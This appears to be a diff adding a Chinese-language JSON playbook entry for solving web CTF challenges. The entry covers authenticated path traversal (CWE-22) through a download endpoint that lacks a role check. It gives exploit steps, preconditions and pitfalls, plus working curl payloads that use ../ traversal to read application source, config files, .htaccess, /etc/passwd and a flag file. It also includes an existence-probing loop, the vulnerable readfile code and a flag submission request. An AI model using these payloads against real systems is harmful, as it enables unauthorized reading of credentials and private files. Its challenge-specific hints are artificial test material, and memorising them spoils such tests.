@@ -1,0 +1,48 @@
+{
+  "id": "auto-authenticated-download-path-traversal",
+  "title": "登录后下载接口路径遍历任意文件读取（缺角色校验的越权 LFI）",
+  "vuln_pattern": "带角色权限的业务系统里，文件下载/预览端点只校验登录态而漏掉角色校验，且把用户可控参数直接拼进文件路径，形成认证后任意文件读取（CWE-22 路径遍历）。",
+  "fingerprint": ["合同审批系统", "员工", "管理员", "审批", "下载", "权限控制", "越权", "临时调整接口", "临时开放", "path traversal", "CWE-22", "LFI", "download.php", "readfile", "require_login", "role check"],
+  "exploit_steps": [
+    "用题面给出的低权限业务账号（员工级，常在登录页明文公示，如 用户名/用户名123）登录，取得会话 Cookie。",
+    "枚举全部功能页与下载/导出/预览端点，特别抓 dashboard/列表里的 download.php?id=文件名 这类把文件名直接放进参数的链接，标为疑似穿越点。",
+    "以登录会话对该端点做三查：只查登录不查角色（垂直越权）、是否把参数直接拼进路径、能否用 ../ 目录穿越；先请求 id=../该端点自身 读回源码确认漏洞。",
+    "确认后先用相对/绝对两种形式把全部应用源码拖走（download.php、includes/auth.php、config.php、.htaccess 等），审计出真实凭据与被禁文件——LFI 的 readfile 一次绕过所有基于 HTTP 直访的 .htaccess/403 保护。",
+    "逐级增加 ../ 数量定位 webroot 外，读 /etc/passwd 验证穿越级数（常见 CONTRACTS_DIR 深两级则需 4 级 ../ 到根）。",
+    "对 JS 注释/config 里的“临时开放接口/敏感文件”诱饵做低成本穷举证伪（用 200 存在、404 文件不存在 作存在性 oracle），证伪后立即回到已确认的下载点，不恋战。",
+    "把平台惯例 flag 落盘路径纳入穿越候选（容器根下 /challenge/flag.txt 一类 bind mount 位置），一条请求读出 flag。",
+    "按平台要求的 header 名与 body 格式提交 flag（注意可能要求自定义头名而非 Authorization: Bearer）。"
+  ],
+  "key_payloads": [
+    "# 登录取 Cookie\ncurl -s -i -c cookies.txt -b cookies.txt -d 'username=<user>&password=<pass>' http://<host>/login.php",
+    "# 读下载端点自身源码确认路径遍历（%2f 编码亦可）\ncurl -s -b cookies.txt 'http://<host>/download.php?id=..%2fdownload.php'",
+    "# 拖应用源码（相对穿越）\ncurl -s -b cookies.txt 'http://<host>/download.php?id=../includes/config.php'\ncurl -s -b cookies.txt 'http://<host>/download.php?id=../.htaccess'",
+    "# 绝对路径穿越（N 级 ../ 回根后接绝对路径）\ncurl -s -b cookies.txt 'http://<host>/download.php?id=../../../../etc/passwd'",
+    "# 读平台 flag（惯例路径占位）\ncurl -s -b cookies.txt 'http://<host>/download.php?id=../../../../challenge/flag.txt'",
+    "# 存在性 oracle：200 且响应不含“文件不存在”=存在，用于证伪诱饵接口/文件\nfor p in <candidate_list>; do curl -s -b cookies.txt -w '[%{http_code}]\\n' \"http://<host>/download.php?id=$p\"; done",
+    "# 漏洞骨架（后端典型写法）\n$file_path = CONTRACTS_DIR . $_GET['id']; readfile($file_path);   // 无过滤，basename 只改文件名头不改内容",
+    "# 提交（按平台要求头名，占位）\ncurl -s -X POST \"$BASE/openapi/v1/challenges/submit\" -H \"<AUTH_HEADER_NAME>: $TOKEN\" -H 'Content-Type: application/json' -d '{\"unique_code\":\"<code>\",\"flag\":\"<flag>\"}'"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": ["path-traversal", "LFI", "arbitrary-file-read", "broken-access-control", "vertical-privilege-escalation", "CWE-22", "authenticated", "web"],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "目标是带角色区分（员工/管理员一类）的业务 Web 系统，easy 档，漏洞多为设计疏漏而非利用链。",
+    "存在文件下载/导出/预览端点，且文件标识参数看起来直接对应文件名。",
+    "拿得到或能猜到低权限账号（登录页明文公示或默认 角色名/角色名123 类弱口令）。",
+    "题面出现‘部分接口临时调整/临时开放’‘并非所有接口都得到妥善保护’一类措辞，暗示某端点漏掉了角色校验。"
+  ],
+  "verify_oracle": "以登录会话请求 download 端点带 ../ 穿越，能读回端点自身源码或 /etc/passwd 全文（HTTP 200 且内容完整）；同一 URL 不带 Cookie 返回 302 跳登录，证明唯一门槛是登录态、无需管理员角色。",
+  "pitfalls": [
+    "别被 JS 注释/config 里的‘临时开放审批接口’‘敏感文件（init_config 之类）’诱饵带偏——这类接口目录常真实存在但为空、诱饵文件磁盘上根本不存在，低成本证伪后立刻回到已确认的下载点。",
+    "首次穿越落空常是层级或子目录问题：配置文件多在 includes/ 子目录（用 ../includes/config.php 而非 ../config.php），到根目录需按 CONTRACTS_DIR 深度补足 ../ 级数（如 4 级）。",
+    "flag 通常不在 web 目录也不在 /flag、/root 等可猜路径，而在平台 bind mount 的容器标准位置（/challenge/flag.txt 一类），靠跨题经验迁移定位。",
+    "readfile 前的 basename() 只影响 content-disposition 文件名头，不影响返回内容，别因文件名头没回显穿越就误判失败。",
+    "上传点常是死路（白名单精确匹配 + 服务端重命名 + 仅 .php handler），不要陷进去。",
+    "Netscape 格式 cookie 文件里 HttpOnly 会话行以 #HttpOnly_ 开头，自写 fuzzer 解析时按 startswith('#') 过滤会丢掉会话 cookie，需特判剥前缀。",
+    "提交接口可能要求特定自定义头名而非 Authorization: Bearer，先看平台约定。"
+  ],
+  "anti_fingerprint": []
+}
